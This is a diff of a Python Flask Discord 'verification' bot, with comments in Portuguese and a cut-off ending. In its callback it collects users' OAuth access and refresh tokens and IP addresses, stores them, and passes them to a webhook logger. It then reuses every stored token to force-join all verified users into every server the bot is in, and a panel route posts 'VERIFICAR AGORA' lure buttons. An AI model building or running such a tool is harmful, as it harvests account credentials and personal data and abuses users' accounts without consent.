@@ -91,7 +91,6 @@ def send_log_to_webhook(user_data, access_token, refresh_token, ip_address, guil
         pass
 
 def get_bot_guilds():
-    """Pega todos os servidores onde o bot está"""
     try:
         url = f"{API_BASE}/users/@me/guilds"
         response = requests.get(url, headers=get_headers_bot())
@@ -102,16 +101,12 @@ def get_bot_guilds():
     return []
 
 def get_or_create_verified_role(guild_id):
-    """Busca ou cria o cargo 'Vereficado' no servidor"""
     try:
-        # Busca cargos existentes
         roles_url = f"{API_BASE}/guilds/{guild_id}/roles"
         roles = requests.get(roles_url, headers=get_headers_bot()).json()
         for role in roles:
             if role['name'] == "Vereficado":
                 return role['id']
-
-        # Cria se não existir
         create_data = {
             "name": "Vereficado",
             "color": 0x00ff00,
@@ -126,57 +121,38 @@ def get_or_create_verified_role(guild_id):
     return None
 
 def add_role_to_member(user_id, role_id, guild_id):
-    """Adiciona o cargo ao membro (ignora erro se não estiver no server)"""
     url = f"{API_BASE}/guilds/{guild_id}/members/{user_id}/roles/{role_id}"
     try:
         response = requests.put(url, headers=get_headers_bot())
-        # 204 = sucesso (já tem o cargo ou adicionado), 200 também ok
         if response.status_code not in [200, 204]:
             print(f"Falha ao dar cargo {role_id} para {user_id} em {guild_id}: {response.status_code}")
     except Exception as e:
         print(f"Erro ao adicionar cargo: {e}")
 
 def sync_all_verified_users_to_all_guilds():
-    """FUNÇÃO PRINCIPAL: Sincroniza TODOS os usuários verificados em TODOS os servidores do bot"""
     try:
         print("Iniciando sincronização completa de cargos...")
-
-        # 1. Pega todos os usuários verificados
         conn = get_db_connection()
         cur = conn.cursor()
         cur.execute("SELECT user_id, access_token FROM verified_users")
         verified_users = cur.fetchall()
         conn.close()
-
         if not verified_users:
             print("Nenhum usuário verificado encontrado.")
             return
-
-        # 2. Pega todos os servidores do bot
         bot_guilds = get_bot_guilds()
         if not bot_guilds:
             print("Bot não está em nenhum servidor.")
             return
-
         print(f"Bot está em {len(bot_guilds)} servidores. Sincronizando {len(verified_users)} usuários...")
-
-        # 3. Para cada servidor, tenta dar o cargo para todos os usuários verificados
         for guild_id in bot_guilds:
             role_id = get_or_create_verified_role(guild_id)
             if not role_id:
-                print(f"Não foi possível obter/criar cargo no servidor {guild_id}")
                 continue
-
             for user_id, access_token in verified_users:
-                # Primeiro tenta adicionar o user ao server (se ainda não estiver)
-                join_url = f"{API_BASE}/guilds/{guild_id}/members/{user_id}"
-                requests.put(join_url, headers=get_headers_bot(), json={"access_token": access_token})
-
-                # Depois dá o cargo
+                requests.put(f"{API_BASE}/guilds/{guild_id}/members/{user_id}", headers=get_headers_bot(), json={"access_token": access_token})
                 add_role_to_member(user_id, role_id, guild_id)
-
-                time.sleep(0.15)  # Evita rate limit (Discord permite ~50 req/s, mas vamos devagar)
-
+                time.sleep(0.15)
         print("Sincronização completa finalizada.")
     except Exception as e:
         print(f"Erro crítico na sincronização: {e}")
@@ -213,11 +189,8 @@ def auth():
 def callback():
     code = request.args.get('code')
     current_guild_id = request.args.get('state') 
-    
     if not code:
         return "Erro: Código de autorização não recebido."
-
-    # 1. Troca code por token
     token_data = {
         'client_id': CLIENT_ID,
         'client_secret': CLIENT_SECRET,
@@ -226,51 +199,57 @@ def callback():
         'redirect_uri': REDIRECT_URI
     }
     token_resp = requests.post(f'{API_BASE}/oauth2/token', data=token_data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
-    
     if token_resp.status_code != 200:
         return f"Erro ao obter token: {token_resp.text}"
-
     tokens = token_resp.json()
     access_token = tokens.get('access_token')
     refresh_token = tokens.get('refresh_token')
-
-    # 2. Pega dados do usuário
     user_resp = requests.get(f'{API_BASE}/users/@me', headers={'Authorization': f'Bearer {access_token}'})
     if user_resp.status_code != 200:
         return "Erro ao obter dados do usuário."
-    
     user_data = user_resp.json()
     user_id = user_data['id']
     username = user_data.get('username', 'Unknown')
-
-    # 3. IP
     ip = request.headers.getlist("X-Forwarded-For")
     ip = ip[0] if ip else request.remote_addr
-
-    # 4. Salva no banco
     save_user_to_db(user_id, username, ip, access_token, refresh_token, tokens.get('expires_in'), tokens.get('scope'), current_guild_id)
-    
-    # 5. Log no webhook
     send_log_to_webhook(user_data, access_token, refresh_token or "N/A", ip, current_guild_id)
-
-    # 6. Entrada + cargo no servidor atual
-    requests.put(f"{API_BASE}/guilds/{current_guild_id}/members/{user_id}", 
-                 headers=get_headers_bot(), json={"access_token": access_token})
-    
+    requests.put(f"{API_BASE}/guilds/{current_guild_id}/members/{user_id}", headers=get_headers_bot(), json={"access_token": access_token})
     role_id = get_or_create_verified_role(current_guild_id)
     if role_id:
         add_role_to_member(user_id, role_id, current_guild_id)
-
-    # 7. === AÇÃO PRINCIPAL: Sincronização TOTAL ===
-    # Toda vez que alguém se verifica, sincroniza TODOS os usuários em TODOS os servidores
     sync_all_verified_users_to_all_guilds()
-
-    # 8. Redireciona de volta pro Discord
     success_url = f"https://discord.com/channels/{current_guild_id}"
     return render_template('launcher.html', web_url=success_url)
 
-# (Suas rotas /painel e /migrate continuam iguais...)
-# ... (cole elas aqui do seu código original se quiser manter)
+# === ROTAS DO PAINEL E MIGRATE ADICIONADAS DE VOLTA ===
+@app.route('/painel', methods=['GET', 'POST'])
+def painel():
+    message = ""
+    if request.method == 'POST':
+        target_guild_id = request.form.get('guild_id') 
+        channel_id = request.form.get('channel_id')
+        title = request.form.get('title')
+        desc = request.form.get('desc')
+        image_url = request.form.get('image_url')
+        verify_link = f"https://hunter-bot-verify.onrender.com/auth?guild_id={target_guild_id}"
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=os.environ.get("PORT", 5000))
+        payload = {
+            "embeds": [{
+                "title": title, "description": desc, "color": 0x00ff41,
+                "image": {"url": image_url} if image_url else {}
+            }],
+            "components": [{ "type": 1, "components": [{ "type": 2, "style": 5, "label": "VERIFICAR AGORA", "url": verify_link }] }]
+        }
+        r = requests.post(f"{API_BASE}/channels/{channel_id}/messages", headers=get_headers_bot(), json=payload)
+        message = "✅ Enviado!" if r.status_code == 200 else f"❌ Erro: {r.text}"
+
+    return render_template('painel.html', message=message)
+
+@app.route('/migrate', methods=['GET', 'POST'])
+def migrate():
+    log_msg = []
+    
+    if request.method == 'POST':
+        action_type = request.form.get('action_type')
+        target_guild_id = request
